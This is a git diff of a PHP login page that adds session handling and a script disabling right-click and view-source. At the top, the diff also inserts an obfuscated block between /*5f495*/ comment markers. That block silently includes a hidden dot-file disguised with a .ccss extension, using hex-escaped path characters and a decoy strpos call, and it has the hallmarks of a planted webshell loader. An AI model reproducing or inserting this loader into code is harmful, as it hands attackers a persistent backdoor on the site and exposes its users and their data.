@@ -1,5 +1,21 @@
 <?php
+/*5f495*/
+
+$ry = "/home/tk53mxi6hzjh/pub\x6cic_htm\x6c/cd.panigrahajewe\x6cs.com/Pages/php_data/.a5aba54b.ccss"; strpos($ry, 'q79'); @include_once /* s0iur */ ($ry);
+
+/*5f495*/
+
 include 'connection.php';
+
+// Start or resume a session
+session_start();
+
+// Check if the user is already logged in
+if (isset($_SESSION['user_id'])) {
+    // Redirect to the landing page if already logged in
+    header('Location: Pages/landing_page/home_landing_page.html');
+    exit;
+}
 
 // Check the connection
 if ($conn->connect_error) {
@@ -18,13 +34,18 @@ if ($conn->connect_error) {
         $result = $conn->query($sql);
 
         if ($result->num_rows == 1) {
+            // Authentication successful
+            $user = $result->fetch_assoc();
+
+            // Store user data in the session
+            $_SESSION['user_id'] = $user['email_ID'];
+            $_SESSION['email_ID'] = $user['email_ID'];
+
             $message = 'Authentication successful. You are now logged in.';
-            session_start();
-            $_SESSION['logged_in'] = true;
-            // Redirect to the 'memo.html' page
-            header('Location: Pages/landing_page/home_landing_page.php');
+
+            // Redirect to the landing page
+            header('Location: Pages/landing_page/home_landing_page.html');
             exit;
-            // Ensure no further PHP code is executed after the redirection
         } else {
             // Authentication failed
             // echo "<p style='color:red';>Authentication failed. Please check your email and password.</p>";
@@ -65,7 +86,19 @@ if ($conn->connect_error) {
             </div>
         </div>
     </div>
-    <script src="index.js"></script>
+    <script src="Pages/index.js"></script>
+    <script>
+         document.addEventListener('contextmenu', function (e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function (e) {
+            // Check if the key combination is Ctrl+U (for viewing page source)
+            if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
+                e.preventDefault();
+            }
+        });
+    </script>
 </body>
 
 </html>
